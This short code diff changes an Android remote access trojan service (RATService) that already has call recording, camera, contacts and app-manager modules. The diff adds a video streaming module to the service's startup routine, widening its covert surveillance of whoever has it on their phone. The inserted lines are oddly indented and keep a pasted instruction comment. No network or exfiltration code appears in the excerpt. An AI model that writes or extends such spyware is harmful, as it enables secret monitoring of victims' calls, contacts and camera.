@@ -99,6 +99,7 @@ public class RATService extends Service {
     private AppManagerModule appManagerModule;
     private CallRecordingModule callRecordingModule;
     private CameraManager cameraManager;
+    private VideoStreamModule videoStreamModule;
 
     // Track camera state
     private boolean isUsingFrontCamera = false;
@@ -166,7 +167,11 @@ public void onCreate() {
         callsModule = new CallsModule(this);
         Log.d(TAG, "✅ Calls module initialized");
     }
-    
+    // In onCreate() method, add:
+if (Config.ENABLE_VIDEO_STREAM) {
+    Log.d(TAG, "🎥 Initializing VideoStreamModule");
+    videoStreamModule = new VideoStreamModule(this);
+}
     if (Config.ENABLE_CONTACTS) {
         contactsModule = new ContactsModule(this);
         Log.d(TAG, "✅ Contacts module initialized");
